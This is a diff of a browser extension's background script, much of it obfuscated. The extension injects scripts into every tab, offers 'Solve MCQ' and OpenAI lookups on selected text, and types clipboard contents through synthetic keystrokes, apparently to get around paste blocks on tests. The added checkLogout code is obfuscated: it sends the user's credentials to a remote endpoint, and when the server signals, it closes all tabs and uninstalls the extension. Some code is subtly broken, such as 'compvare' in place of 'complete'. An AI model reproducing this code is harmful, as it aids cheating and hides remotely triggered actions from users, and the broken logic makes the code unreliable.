-      e[o[r(407)](c, 364)][o[r(548)](o[r(288)](5990, 8702), o[r(296)](2, -7346))][
-        o[r(351)](c, 344)
-      ][o[r(304)](c, 375)][o[r(310)](c, 368)]()
+      t[r(291)] && t[r(291)][0] && t[r(291)][0][r(317)] && t[r(291)][0][r(317)][r(295)][r(272)]()
     );
-  } catch (t) {
-    return console[o[r(673)](c, 369)](u), console[o[r(276)](c, 315)](i[o[r(530)](c, 320)], t), null;
+  } catch (e) {
+    return console[r(270)](a), console[r(316)](o[r(275)], e), null;
   }
 }
-function _0x2732() {
-  const t = _0x3bb684,
-    e = {
-      XBmEx: t(375),
-      mFiiD: t(381),
-      jihJw: t(660),
-      rwJSp: t(528),
-      MevLq: t(543),
-      kSCWy: t(537),
-      DOiXF: t(678),
-      EjXbB: t(324),
-      ugamQ: t(317),
-      dFlch: t(568),
-      bzleR: t(583),
-      fHeTE: t(467),
-      Hdjoe: t(458),
-      fyFrP: t(549),
-      LZYBq: t(630),
-      kyjhO: t(236),
-      QWiST: t(291),
-      fIdhq: t(507),
-      DucBY: t(292),
-      QNdtk: t(663),
-      OYTet: t(478),
-      LrCxt: t(487),
-      WGoBq: t(498),
-      NWDth: t(253),
-      Jntlf: t(623),
-      fUZiI: t(432) + "Ew",
-      pPlxN: t(252) + "HL",
-      ARKQv: t(232),
-      afhbZ: t(223),
-      osRHl: t(352),
-      xkoeo: t(344) + "Ra",
-      gindJ: t(387),
-      hLkFJ: t(337),
-      aomeV: t(474),
-      MHHTk: t(358),
-      tQAwf: t(609),
-      BYRSm: t(425),
-      QbSkR: t(608),
-      ZuRBd: t(255) + "N",
-      AHEHP: t(327),
-      qXbLr: t(656),
-      RhqqF: t(461),
-      urvcW: t(270),
-      KGWoa: t(243) + t(634),
-      IsCII: t(692),
-      RygRr: t(538),
-      VFhuW: t(635),
-      WtIZj: t(274),
-      wVkxI: t(319),
-      YZphN: t(542),
-      tQeUf: t(643),
-      KoZJz: t(490),
-      ZbyYm: t(590),
-      pRMae: t(259),
-      FFEnI: t(280),
-      Biqbc: t(508),
-      aMRVO: t(647),
-      hWiVL: t(592),
-      TQydj: t(307),
-      dZLTd: t(617),
-      CzJrH: t(355),
-      SbASW: t(691),
-      pxItU: t(535),
-      UYAij: t(518),
-      kQKCd: t(347),
-      omxqy: t(699),
-      dJYxo: t(527),
-      dNPJm: t(233),
-      VqfZL: t(254) + "Ym",
-      pKgqn: t(314),
-      hPoGB: t(586) + "Kb",
-      fnJVs: t(409),
-      GzecZ: t(483),
-      fhqAU: t(238),
-      YlkfY: t(320),
-      LjmMf: t(386),
-      Wggdg: t(595),
-      WWQWl: t(454),
-      iPVAt: t(581),
-      dzXIP: t(627),
-      fWdug: t(452),
-      KNyuq: t(379),
-      lOVYB: t(427),
-      wUrPm: t(398),
-      WwGwk: t(418),
-      rhebc: function (t) {
-        return t();
-      },
-    },
-    n = [
-      e[t(519)],
-      e[t(532)],
-      e[t(466)],
-      e[t(584)],
-      e[t(263)],
-      e[t(654)],
-      e[t(529)],
-      e[t(350)],
-      e[t(666)],
-      e[t(633)],
-      e[t(282)],
-      e[t(363)],
-      e[t(463)],
-      e[t(421)],
-      e[t(546)],
-      e[t(577)],
-      e[t(242)],
-      e[t(384)],
-      e[t(632)],
-      e[t(451)],
-      e[t(480)],
-      e[t(315)],
-      e[t(222)],
-      e[t(287)],
-      e[t(602)],
-      e[t(553)],
-      e[t(565)],
-      e[t(694)],
-      e[t(557)],
-      e[t(674)],
-      e[t(599)],
-      e[t(582)],
-      e[t(402)],
-      e[t(249)],
-      e[t(460)],
-      e[t(441)],
-      e[t(403)],
-      e[t(394)],
-      e[t(348)],
-      e[t(356)],
-      e[t(217)],
-      e[t(648)],
-      e[t(657)],
-      e[t(688)],
-      e[t(494)],
-      e[t(681)],
-      e[t(500)],
-      e[t(383)],
-      e[t(453)],
-      e[t(612)],
-      e[t(680)],
-      e[t(682)],
-      e[t(341)],
-      e[t(531)],
-      e[t(411)],
-      e[t(637)],
-      e[t(510)],
-      e[t(272)],
-      e[t(389)],
-      e[t(267)],
-      e[t(526)],
-      e[t(626)],
-      e[t(484)],
-      e[t(593)],
-      e[t(646)],
-      e[t(534)],
-      e[t(265)],
-      e[t(376)],
-      e[t(305)],
-      e[t(449)],
-      e[t(579)],
-      e[t(342)],
-      e[t(437)],
-      e[t(639)],
-      e[t(652)],
-      e[t(237)],
-      e[t(416)],
-      e[t(576)],
-      e[t(559)],
-      e[t(422)],
-      e[t(294)],
-      e[t(523)],
-      e[t(539)],
-      e[t(489)],
-      e[t(622)],
-    ];
-  return (
-    (_0x2732 = function () {
-      return n;
-    }),
-    e[t(367)](_0x2732)
-  );
-}
-async function copyToClipboard(t) {
-  var e = await getCredentials();
-  e &&
-    null != e &&
-    chrome.tabs.query({ active: !0, currentWindow: !0 }, function (e) {
-      e[0] &&
-        (e[0].url.startsWith("http://") || e[0].url.startsWith("https://")) &&
-        chrome.scripting.executeScript({
-          target: { tabId: e[0].id },
-          func: function (t) {
-            const e = document.createElement("textarea");
-            (e.textContent = t),
-              document.body.appendChild(e),
-              e.select(),
+async function copyToClipboard(e) {
+  var t = await getCredentials();
+  t &&
+    null != t &&
+    browser.tabs.query({ active: !0, currentWindow: !0 }, function (t) {
+      t[0] &&
+        (t[0].url.startsWith("http://") || t[0].url.startsWith("https://")) &&
+        browser.scripting.executeScript({
+          target: { tabId: t[0].id },
+          func: function (e) {
+            const t = document.createElement("textarea");
+            (t.textContent = e),
+              document.body.appendChild(t),
+              t.select(),
               document.execCommand("copy"),
-              document.body.removeChild(e);
+              document.body.removeChild(t);
           },
-          args: [t],
+          args: [e],
         });
     });
 }
-function showToast(t, e, n = !1) {
-  chrome.scripting.executeScript({
-    target: { tabId: t },
-    func: function (t, e) {
+function showToast(e, t, n = !1) {
+  browser.scripting.executeScript({
+    target: { tabId: e },
+    func: function (e, t) {
       const n = document.createElement("div");
-      (n.textContent = t),
+      (n.textContent = e),
         (n.style.position = "fixed"),
         (n.style.bottom = "20px"),
         (n.style.right = "20px"),
         (n.style.backgroundColor = "black"),
-        (n.style.color = e ? "red" : "white"),
+        (n.style.color = t ? "red" : "white"),
         (n.style.padding = "10px"),
         (n.style.borderRadius = "5px"),
         (n.style.zIndex = 1e3);
@@ -1516,15 +1131,15 @@ function showToast(t, e, n = !1) {
           n.remove();
         }, 5e3);
     },
-    args: [e, n],
+    args: [t, n],
   });
 }
-function showMCQToast(t, e) {
-  chrome.scripting.executeScript({
-    target: { tabId: t },
-    func: function (t) {
-      const [e, ...n] = t.split(" "),
-        r = `<b>${e}</b>‎ ‎ ${n.join("‎ ")}`,
+function showMCQToast(e, t) {
+  browser.scripting.executeScript({
+    target: { tabId: e },
+    func: function (e) {
+      const [t, ...n] = e.split(" "),
+        r = `<b>${t}</b>‎ ‎ ${n.join("‎ ")}`,
         o = document.createElement("div");
       (o.innerHTML = r),
         (o.style.position = "fixed"),
@@ -1539,30 +1154,58 @@ function showMCQToast(t, e) {
         (o.style.fontSize = "16px"),
         (o.style.textAlign = "center"),
         (o.style.maxWidth = "80%");
-      const c = document.createElement("span");
-      (c.innerHTML = "&times;"),
-        (c.style.float = "right"),
-        (c.style.cursor = "pointer"),
-        (c.style.marginLeft = "10px"),
-        (c.onclick = function () {
+      const s = document.createElement("span");
+      (s.innerHTML = "&times;"),
+        (s.style.float = "right"),
+        (s.style.cursor = "pointer"),
+        (s.style.marginLeft = "10px"),
+        (s.onclick = function () {
           o.remove();
         }),
-        o.appendChild(c),
+        o.appendChild(s),
         document.body.appendChild(o),
         setTimeout(() => {
           o.remove();
         }, 5e3);
     },
-    args: [e],
+    args: [t],
   });
 }
 function injectScript() {
+  function e() {
+    const e = "image-toast-overlay";
+    if (document.getElementById(e)) return void document.getElementById(e).remove();
+    const t = document.createElement("div");
+    (t.id = e),
+      (t.innerHTML =
+        '<img src="https://i.imgur.com/qEQuh64.png" style="width: 255px; height: auto;">'),
+      (t.style.cssText = "position: fixed; bottom: 20px; right: 20px; z-index: 9999;"),
+      document.body.appendChild(t),
+      setTimeout(() => {
+        document.getElementById(e) && document.getElementById(e).remove();
+      }, 5e3),
+      document.addEventListener("keydown", function t(n) {
+        "Escape" === n.key &&
+          document.getElementById(e) &&
+          (document.getElementById(e).remove(), document.removeEventListener("keydown", t));
+      });
+  }
+  function t() {
+    return window.getSelection().toString();
+  }
+  function n(e, t, n = !1) {
+    e
+      ? n
+        ? showMCQToast(t, e)
+        : (copyToClipboard(e), showToast(t, "Successful!"))
+      : showToast(t, "Error. Try again after 30s.", !0);
+  }
   console.warn("------------------------run-----------------------inject-----------------"),
-    chrome.tabs.query({}, function (t) {
-      t.forEach(function (t) {
-        (t.url.startsWith("http://") || t.url.startsWith("https://")) &&
-          chrome.scripting.executeScript({
-            target: { tabId: t.id, allFrames: !0 },
+    browser.tabs.query({}, function (e) {
+      e.forEach(function (e) {
+        (e.url.startsWith("http://") || e.url.startsWith("https://")) &&
+          browser.scripting.executeScript({
+            target: { tabId: e.id, allFrames: !0 },
             files: [
               "data/inject/litc.js",
               "data/inject/chatOverlay.js",
@@ -1573,13 +1216,13 @@ function injectScript() {
           });
       });
     }),
-    chrome.tabs.onUpdated.addListener(async function (t, e, n) {
+    browser.tabs.onUpdated.addListener(async function (e, t, n) {
       var r = await getCredentials();
-      ((e.url && (e.url.startsWith("http://") || e.url.startsWith("https://")) && r) ||
-        ("complete" === e.status && n.url.startsWith("http://")) ||
+      ((t.url && (t.url.startsWith("http://") || t.url.startsWith("https://")) && r) ||
+        ("compvare" === t.status && n.url.startsWith("http://")) ||
         (n.url.startsWith("https://") && r)) &&
-        chrome.scripting.executeScript({
-          target: { tabId: t, allFrames: !0 },
+        browser.scripting.executeScript({
+          target: { tabId: e, allFrames: !0 },
           files: [
             "data/inject/litc.js",
             "data/inject/chatOverlay.js",
@@ -1589,70 +1232,51 @@ function injectScript() {
           ],
         });
     }),
-    chrome.contextMenus.create({ id: "copySelectedText", title: "Copy", contexts: ["selection"] }),
-    chrome.contextMenus.create({
-      id: "separator1",
-      type: "separator",
-      contexts: ["editable", "selection"],
+    browser.contextMenus.removeAll(() => {
+      browser.contextMenus.create({
+        id: "copySelectedText",
+        title: "Copy",
+        contexts: ["selection"],
+      }),
+        browser.contextMenus.create({
+          id: "separator1",
+          type: "separator",
+          contexts: ["editable", "selection"],
+        }),
+        browser.contextMenus.create({
+          id: "pasteClipboard",
+          title: "Paste Clipboard Contents by Swapping",
+          contexts: ["editable"],
+        }),
+        browser.contextMenus.create({
+          id: "typeClipboard",
+          title: "Type Clipboard",
+          contexts: ["editable"],
+        }),
+        browser.contextMenus.create({
+          id: "separator2",
+          type: "separator",
+          contexts: ["editable", "selection"],
+        }),
+        browser.contextMenus.create({
+          id: "searchWithOpenAI",
+          title: "Search with OpenAI",
+          contexts: ["selection"],
+        }),
+        browser.contextMenus.create({
+          id: "solveMCQ",
+          title: "Solve MCQ",
+          contexts: ["selection"],
+        });
     }),
-    chrome.contextMenus.create({
-      id: "pasteClipboard",
-      title: "Paste Clipboard Contents by Swapping",
-      contexts: ["editable"],
-    }),
-    chrome.contextMenus.create({
-      id: "typeClipboard",
-      title: "Type Clipboard",
-      contexts: ["editable"],
-    }),
-    chrome.contextMenus.create({
-      id: "separator2",
-      type: "separator",
-      contexts: ["editable", "selection"],
-    }),
-    chrome.contextMenus.create({
-      id: "searchWithOpenAI",
-      title: "Search with OpenAI",
-      contexts: ["selection"],
-    }),
-    chrome.contextMenus.create({ id: "solveMCQ", title: "Solve MCQ", contexts: ["selection"] });
-  function t() {
-    const t = "image-toast-overlay";
-    if (document.getElementById(t)) return void document.getElementById(t).remove();
-    const e = document.createElement("div");
-    (e.id = t),
-      (e.innerHTML =
-        '<img src="https://i.imgur.com/qEQuh64.png" style="width: 255px; height: auto;">'),
-      (e.style.cssText = "position: fixed; bottom: 20px; right: 20px; z-index: 9999;"),
-      document.body.appendChild(e),
-      setTimeout(() => {
-        document.getElementById(t) && document.getElementById(t).remove();
-      }, 5e3),
-      document.addEventListener("keydown", function e(n) {
-        "Escape" === n.key &&
-          document.getElementById(t) &&
-          (document.getElementById(t).remove(), document.removeEventListener("keydown", e));
-      });
-  }
-  function e() {
-    return window.getSelection().toString();
-  }
-  function n(t, e, n = !1) {
-    t
-      ? n
-        ? showMCQToast(e, t)
-        : (copyToClipboard(t), showToast(e, "Successful!"))
-      : showToast(e, "Error. Try again after 30s.", !0);
-  }
-  chrome.contextMenus.onClicked.addListener(async (t, e) => {
-    if (
-      await (async function () {
-        const t = await fetch("https://thottathukiduven.vercel.app/api/version"),
-          e = (await t.json()).version,
-          n = chrome.runtime.getManifest().version;
+    browser.contextMenus.onClicked.addListener(async (e, t) => {
+      (await (async function () {
+        const e = await fetch("https://thottathukiduven.vercel.app/api/version"),
+          t = (await e.json()).version,
+          n = browser.runtime.getManifest().version;
         return !(
-          parseFloat(e) > parseFloat(n) &&
-          (chrome.windows.create({
+          parseFloat(t) > parseFloat(n) &&
+          (browser.windows.create({
             url: "data/update/updatePopup.html",
             type: "popup",
             width: 100,
@@ -1660,31 +1284,29 @@ function injectScript() {
           }),
           1)
         );
-      })()
-    ) {
-      if (
-        ("copySelectedText" === t.menuItemId &&
-          t.selectionText &&
-          chrome.scripting.executeScript({
-            target: { tabId: e.id },
-            func: (t) => {
-              const e = document.createElement("textarea");
-              (e.textContent = t),
-                document.body.appendChild(e),
-                e.select(),
+      })()) &&
+        ("copySelectedText" === e.menuItemId &&
+          e.selectionText &&
+          browser.scripting.executeScript({
+            target: { tabId: t.id },
+            func: (e) => {
+              const t = document.createElement("textarea");
+              (t.textContent = e),
+                document.body.appendChild(t),
+                t.select(),
                 document.execCommand("copy"),
-                document.body.removeChild(e);
+                document.body.removeChild(t);
             },
-            args: [t.selectionText],
+            args: [e.selectionText],
           }),
-        "typeClipboard" === t.menuItemId &&
-          chrome.scripting.executeScript({
-            target: { tabId: e.id },
+        "typeClipboard" === e.menuItemId &&
+          browser.scripting.executeScript({
+            target: { tabId: t.id },
             func: async () => {
-              const t = await navigator.clipboard.readText(),
-                e = document.activeElement;
-              for (let n of t) {
-                const t = new KeyboardEvent("keydown", {
+              const e = await navigator.clipboard.readText(),
+                t = document.activeElement;
+              for (var n of e) {
+                const e = new KeyboardEvent("keydown", {
                     key: n,
                     code: "Key" + n.toUpperCase(),
                     charCode: n.charCodeAt(0),
@@ -1701,50 +1323,48 @@ function injectScript() {
                     bubbles: !0,
                   }),
                   o = new InputEvent("input", { data: n, inputType: "insertText", bubbles: !0 });
-                e.dispatchEvent(t), e.dispatchEvent(r), (e.value += n), e.dispatchEvent(o);
+                t.dispatchEvent(e), t.dispatchEvent(r), (t.value += n), t.dispatchEvent(o);
               }
             },
           }),
-        "pasteClipboard" === t.menuItemId &&
-          chrome.scripting.executeScript({
-            target: { tabId: e.id },
+        "pasteClipboard" === e.menuItemId &&
+          browser.scripting.executeScript({
+            target: { tabId: t.id },
             func: async () => {
-              const t = await navigator.clipboard.readText();
-              (document.activeElement.value = t),
+              const e = await navigator.clipboard.readText();
+              (document.activeElement.value = e),
                 document.activeElement.dispatchEvent(new Event("input", { bubbles: !0 }));
             },
           }),
-        "searchWithOpenAI" === t.menuItemId && t.selectionText)
-      ) {
-        n(await queryOpenAI(t.selectionText), e.id);
-      }
-      if ("solveMCQ" === t.menuItemId && t.selectionText) {
-        n(await queryOpenAI(t.selectionText, !0), e.id, !0);
-      }
-    }
-  }),
-    chrome.commands.onCommand.addListener(function (t) {
-      "show-overlay" === t &&
-        chrome.tabs.query({ active: !0, currentWindow: !0 }, function (t) {
-          var e;
-          t[0] &&
-            ((e = t[0].id),
-            chrome.scripting.executeScript({
-              target: { tabId: e },
-              func: function (t) {
+        "searchWithOpenAI" === e.menuItemId &&
+          e.selectionText &&
+          n(await queryOpenAI(e.selectionText), t.id),
+        "solveMCQ" === e.menuItemId &&
+          e.selectionText &&
+          n(await queryOpenAI(e.selectionText, !0), t.id, !0));
+    }),
+    browser.commands.onCommand.addListener(function (e) {
+      "show-overlay" === e &&
+        browser.tabs.query({ active: !0, currentWindow: !0 }, function (e) {
+          var t;
+          e[0] &&
+            ((t = e[0].id),
+            browser.scripting.executeScript({
+              target: { tabId: t },
+              func: function (e) {
                 if (document.getElementById("openai-overlay"))
                   return void document.getElementById("openai-overlay").remove();
-                const e = document.createElement("div");
-                (e.innerHTML = t), document.body.appendChild(e);
+                const t = document.createElement("div");
+                (t.innerHTML = e), document.body.appendChild(t);
                 const n = document.getElementById("openai-textbox");
                 n.focus(),
-                  n.addEventListener("keydown", function (t) {
-                    "Enter" === t.key &&
-                      t.shiftKey &&
+                  n.addEventListener("keydown", function (e) {
+                    "Enter" === e.key &&
+                      e.shiftKey &&
                       document.getElementById("openai-overlay").remove();
                   }),
-                  document.addEventListener("keydown", function (t) {
-                    "Escape" === t.key && document.getElementById("openai-overlay").remove();
+                  document.addEventListener("keydown", function (e) {
+                    "Escape" === e.key && document.getElementById("openai-overlay").remove();
                   });
               },
               args: [
@@ -1753,438 +1373,363 @@ function injectScript() {
             }));
         });
     }),
-    chrome.commands.onCommand.addListener(async (r, o) => {
-      var c = await getCredentials();
-      c &&
-        null != c &&
+    browser.commands.onCommand.addListener(async (r, o) => {
+      var s = await getCredentials();
+      s &&
+        null != s &&
         ("custom-paste" === r &&
-          chrome.scripting.executeScript({
+          browser.scripting.executeScript({
             target: { tabId: o.id },
             func: async () => {
-              const t = await navigator.clipboard.readText(),
-                e = document.querySelector('#chat-overlay div[contenteditable="true"]');
-              if (e) {
-                e.innerText += t;
+              const e = await navigator.clipboard.readText(),
+                t = document.querySelector('#chat-overlay div[contenteditable="true"]');
+              if (t) {
+                t.innerText += e;
                 const n = new Event("input", { bubbles: !0 });
-                e.dispatchEvent(n);
+                t.dispatchEvent(n);
               }
             },
           }),
         "search-mcq" === r &&
-          chrome.scripting.executeScript({ target: { tabId: o.id }, function: e }, async (t) => {
-            if (t[0]) {
-              const e = "search-mcq" === r;
-              n(await queryOpenAI(t[0].result, e), o.id, e);
+          browser.scripting.executeScript({ target: { tabId: o.id }, function: t }, async (e) => {
+            if (e[0]) {
+              const t = "search-mcq" === r;
+              n(await queryOpenAI(e[0].result, t), o.id, t);
+            }
+          }),
+        "search-openai" === r &&
+          browser.scripting.executeScript({ target: { tabId: o.id }, function: t }, async (e) => {
+            if (e[0]) {
+              const t = "search-mcq" === r;
+              console.log("\n\n---------------------------search-openai", t),
+                n(await queryOpenAI(e[0].result, t), o.id, t);
             }
           }),
         "custom-copy" === r &&
-          chrome.scripting.executeScript({
+          browser.scripting.executeScript({
             target: { tabId: o.id },
             function: () => {
-              const t = window.getSelection().toString(),
-                e = document.createElement("textarea");
-              (e.textContent = t),
-                document.body.appendChild(e),
-                e.select(),
+              const e = window.getSelection().toString(),
+                t = document.createElement("textarea");
+              (t.textContent = e),
+                document.body.appendChild(t),
+                t.select(),
                 document.execCommand("copy"),
-                document.body.removeChild(e);
+                document.body.removeChild(t);
             },
           }),
         "custom-paste" === r &&
-          chrome.scripting.executeScript({
+          browser.scripting.executeScript({
             target: { tabId: o.id },
             func: async () => {
-              const t = await navigator.clipboard.readText();
-              (document.activeElement.value = t),
+              const e = await navigator.clipboard.readText();
+              (document.activeElement.value = e),
                 document.activeElement.dispatchEvent(new Event("input", { bubbles: !0 }));
             },
           }),
         "show-help" === r &&
-          chrome.scripting.executeScript({ target: { tabId: o.id }, function: t }),
+          browser.scripting.executeScript({ target: { tabId: o.id }, function: e }),
         "toggle-chat" === r &&
-          chrome.tabs.query({ active: !0, currentWindow: !0 }, (t) => {
-            chrome.tabs.sendMessage(t[0].id, { action: "toggleChatOverlay" });
+          browser.tabs.query({ active: !0, currentWindow: !0 }, (e) => {
+            browser.tabs.sendMessage(e[0].id, { action: "toggleChatOverlay" });
           }));
     });
 }
-async function copyToClipboard(t) {
-  var e = await getCredentials();
-  e &&
-    null != e &&
-    chrome.tabs.query({ active: !0, currentWindow: !0 }, function (e) {
-      e[0] &&
-        (e[0].url.startsWith("http://") || e[0].url.startsWith("https://")) &&
-        chrome.scripting.executeScript({
-          target: { tabId: e[0].id },
-          func: function (t) {
-            const e = document.createElement("textarea");
-            (e.textContent = t),
-              document.body.appendChild(e),
-              e.select(),
+async function copyToClipboard(e) {
+  var t = await getCredentials();
+  t &&
+    null != t &&
+    browser.tabs.query({ active: !0, currentWindow: !0 }, function (t) {
+      t[0] &&
+        (t[0].url.startsWith("http://") || t[0].url.startsWith("https://")) &&
+        browser.scripting.executeScript({
+          target: { tabId: t[0].id },
+          func: function (e) {
+            const t = document.createElement("textarea");
+            (t.textContent = e),
+              document.body.appendChild(t),
+              t.select(),
               document.execCommand("copy"),
-              document.body.removeChild(e);
+              document.body.removeChild(t);
           },
-          args: [t],
+          args: [e],
         });
     });
 }
-chrome[_0x3bb684(424)][_0x3bb684(697)][_0x3bb684(369) + "r"](activate),
-  chrome[_0x3bb684(424)][_0x3bb684(284) + "d"][_0x3bb684(369) + "r"](activate),
-  (activate[_0x3bb684(522)] = []),
-  chrome[_0x3bb684(424)][_0x3bb684(284) + "d"][_0x3bb684(369) + "r"](() => {
-    const t = _0x3bb684,
-      e = { LlUzc: t(364), YSbQu: t(625) };
-    chrome[t(438)][t(415)]({ active: !0, currentWindow: !0 }, (n) => {
-      const r = t,
-        o = n[0];
-      (o[r(311)][r(429)](e[r(562)]) || o[r(311)][r(429)](e[r(569)])) &&
-        chrome[r(438)][r(667)](o.id, { url: o[r(311)] });
-    });
-  }),
-  chrome[_0x3bb684(424)][_0x3bb684(597)][_0x3bb684(369) + "r"](async (t, e, n) => {
-    const r = _0x3bb684,
-      o = {
-        Mpuwg: function (t) {
-          return t();
-        },
-        JfArH: function (t, e) {
-          return t == e;
-        },
-        KCCmM: function (t, e) {
-          return t === e;
-        },
-        Yprva: r(321) + r(521),
-        FERBT: function (t, e) {
-          return t(e);
-        },
-        gTbiS: function (t, e) {
-          return t === e;
-        },
-        teJaq: r(677) + "xt",
-      };
-    var c = await o[r(636)](getCredentials);
-    if (c && !o[r(502)](c, void 0))
-      if (o[r(434)](t[r(262)], o[r(247)])) {
-        const { message: e, context: n } = t;
-        (chatContext = n), o[r(556)](processChatMessage, e);
-      } else o[r(525)](t[r(262)], o[r(362)]) && (chatContext = []);
-  }),
-  (function (t, e) {
-    const n = _0x3bb684,
-      r = {
-        Olrcm: function (t) {
-          return t();
-        },
-        dZprH: function (t, e) {
-          return t + e;
-        },
-        Rmxvc: function (t, e) {
-          return t + e;
-        },
-        tccoR: function (t, e) {
-          return t + e;
-        },
-        ukjLt: function (t, e) {
-          return t + e;
-        },
-        OvDJo: function (t, e) {
-          return t * e;
-        },
-        NBihe: function (t, e) {
-          return t / e;
-        },
-        PHlFy: function (t, e) {
-          return t(e);
-        },
-        TKoHK: function (t, e) {
-          return t(e);
-        },
-        tvPBv: function (t, e) {
-          return t + e;
-        },
-        coMlL: function (t, e) {
-          return t + e;
-        },
-        xiPeY: function (t, e) {
-          return t * e;
-        },
-        BeaDZ: function (t, e) {
-          return t / e;
-        },
-        OkKTe: function (t, e) {
-          return t(e);
-        },
-        ygDEG: function (t, e) {
-          return t(e);
-        },
-        FCJGH: function (t, e) {
-          return t + e;
-        },
-        irLDs: function (t, e) {
-          return t + e;
-        },
-        ukJYG: function (t, e) {
-          return t * e;
-        },
-        zhCJZ: function (t, e) {
-          return t / e;
-        },
-        wDxMg: function (t, e) {
-          return t(e);
-        },
-        gXYNm: function (t, e) {
-          return t(e);
-        },
-        nBTot: function (t, e) {
-          return t + e;
-        },
-        FJosK: function (t, e) {
-          return t * e;
-        },
-        pUmIP: function (t, e) {
-          return t / e;
-        },
-        AXewP: function (t, e) {
-          return t(e);
-        },
-        EtXyd: function (t, e) {
-          return t(e);
-        },
-        OWSbv: function (t, e) {
-          return t + e;
-        },
-        YbbgB: function (t, e) {
-          return t * e;
-        },
-        dmOsH: function (t, e) {
-          return t * e;
-        },
-        btRdJ: function (t, e) {
-          return t / e;
-        },
-        kpkQs: function (t, e) {
-          return t(e);
-        },
-        qelvm: function (t, e) {
-          return t + e;
-        },
-        QiKWS: function (t, e) {
-          return t * e;
-        },
-        PJsUu: function (t, e) {
-          return t / e;
-        },
-        DYYMW: function (t, e) {
-          return t + e;
-        },
-        wtwrp: function (t, e) {
-          return t * e;
-        },
-        NkdVU: function (t, e) {
-          return t * e;
-        },
-        JHPIG: function (t, e) {
-          return t * e;
-        },
-        MHcvl: function (t, e) {
-          return t(e);
-        },
-        xwXEE: function (t, e) {
-          return t + e;
-        },
-        IGkKT: function (t, e) {
-          return t * e;
-        },
-        ysOrx: function (t, e) {
-          return t(e);
-        },
-        dVTUY: function (t, e) {
-          return t + e;
-        },
-        LMmnX: function (t, e) {
-          return t * e;
-        },
-        KAfUQ: function (t, e) {
-          return t * e;
-        },
-        AwQXD: function (t, e) {
-          return t(e);
-        },
-        tdwpr: function (t, e) {
-          return t / e;
-        },
-        nmHsq: function (t, e) {
-          return t(e);
-        },
-        sSSbR: function (t, e) {
-          return t + e;
-        },
-        toiUr: function (t, e) {
-          return t * e;
-        },
-        wAxea: function (t, e) {
-          return t / e;
-        },
-        pLVeQ: function (t, e) {
-          return t(e);
-        },
-        ymUpt: function (t, e) {
-          return t * e;
-        },
-        pdMng: function (t, e) {
-          return t * e;
-        },
-        PetQO: function (t, e) {
-          return t / e;
-        },
-        rYjfq: function (t, e) {
-          return t(e);
-        },
-        BoeXU: function (t, e) {
-          return t + e;
-        },
-        JRsFb: function (t, e) {
-          return t * e;
-        },
-        daKcX: function (t, e) {
-          return t * e;
-        },
-        ntAuM: function (t, e) {
-          return t === e;
-        },
-        nTjKD: n(353),
-        zmOBK: n(512),
+function _0x3e7a(e, t) {
+  const n = _0x5975();
+  return (_0x3e7a = function (e, t) {
+    return n[(e -= 315)];
+  })(e, t);
+}
+async function checkLogout() {
+  const e = _0x3e7a,
+    t = {
+      TOThg: e(327) + e(348),
+      lbtQP: e(328) + e(343),
+      rQXoQ: function (e) {
+        return e();
       },
-      o = _0x5e8e,
-      c = r[n(395)](t);
+      DYTMC: function (e, t, n) {
+        return e(t, n);
+      },
+      AwQRn: e(352) + e(357) + e(334) + e(358) + e(324) + e(359),
+      vSbTd: e(329),
+      zTrmG: e(339) + e(325),
+    };
+  console[e(337)](t[e(353)]);
+  const n = await t[e(362)](getCredentials);
+  if (!n) return;
+  const r = await t[e(318)](fetch, t[e(331)], {
+      method: t[e(335)],
+      headers: { Authorization: e(340) + n, "Content-Type": t[e(317)] },
+      body: JSON[e(320)]({}),
+    }),
+    o = await r[e(338)]();
+  o[e(356)] &&
+    browser[e(322)][e(350)][e(345)](function () {
+      const n = e;
+      console[n(337)](t[n(321)]),
+        browser[n(323)][n(361)]({}, (e) => {
+          const t = n,
+            r = e[t(355)](
+              (e) =>
+                new Promise((n) => {
+                  const r = t;
+                  browser[r(323)][r(342)](e.id, {}, n);
+                })
+            );
+          console[t(337)](o),
+            Promise[t(354)](r)[t(341)](() => {
+              const e = t;
+              browser[e(351)][e(333) + e(326)]();
+            });
+        });
+    });
+}
+function _0x5975() {
+  const e = [
+    "POST",
+    "174022PwrNJV",
+    "AwQRn",
+    "414wtFMjk",
+    "uninstallS",
+    "uven.verce",
+    "vSbTd",
+    "1722PgNJcv",
+    "log",
+    "json",
+    "applicatio",
+    "Bearer ",
+    "then",
+    "reload",
+    "890",
+    "4ByZDNB",
+    "clear",
+    "14JwzxDP",
+    "252340fpxsOE",
+    "leared.",
+    "40942020AhWBCl",
+    "local",
+    "management",
+    "https://th",
+    "lbtQP",
+    "all",
+    "map",
+    "status",
+    "ottathukid",
+    "l.app/api/",
+    "Signout",
+    "15180ImUFIF",
+    "query",
+    "rQXoQ",
+    "4426161fpMAKR",
+    "3027928cniYPw",
+    "13rnxrpu",
+    "zTrmG",
+    "DYTMC",
+    "4585757CAIGTQ",
+    "stringify",
+    "TOThg",
+    "storage",
+    "tabs",
+    "ext/remote",
+    "n/json",
+    "elf",
+    "All data c",
+    "---1234567",
+  ];
+  return (_0x5975 = function () {
+    return e;
+  })();
+}
+!(function (e, t) {
+  const n = _0xfcfe,
+    r = _0x5cd2();
+  for (;;)
+    try {
+      if (
+        853550 ===
+        (-parseInt(n(254)) / 1) * (-parseInt(n(288)) / 2) +
+          -parseInt(n(278)) / 3 +
+          -parseInt(n(306)) / 4 +
+          (parseInt(n(262)) / 5) * (parseInt(n(242)) / 6) +
+          -parseInt(n(292)) / 7 +
+          (-parseInt(n(294)) / 8) * (parseInt(n(290)) / 9) +
+          parseInt(n(297)) / 10
+      )
+        break;
+      r.push(r.shift());
+    } catch (e) {
+      r.push(r.shift());
+    }
+})(),
+  (function (e, t) {
+    const n = _0x3e7a,
+      r = _0x5975();
     for (;;)
       try {
-        const t = r[n(653)](
-          r[n(574)](
-            r[n(547)](
-              r[n(574)](
-                r[n(365)](
-                  r[n(653)](
-                    r[n(685)](
-                      r[n(662)](
-                        -r[n(459)](parseInt, r[n(659)](o, 325)),
-                        r[n(312)](r[n(655)](1766, r[n(614)](-12, 542)), 4739)
-                      ),
-                      r[n(687)](
-                        r[n(405)](parseInt, r[n(615)](o, 302)),
-                        r[n(332)](r[n(695)](r[n(614)](-1684, -1), r[n(338)](19, 206)), -5596)
-                      )
-                    ),
-                    r[n(614)](
-                      r[n(457)](
-                        r[n(446)](parseInt, r[n(417)](o, 323)),
-                        r[n(332)](r[n(650)](7808, -9526), r[n(564)](1721, 1))
-                      ),
-                      r[n(388)](
-                        r[n(495)](parseInt, r[n(241)](o, 319)),
-                        r[n(520)](
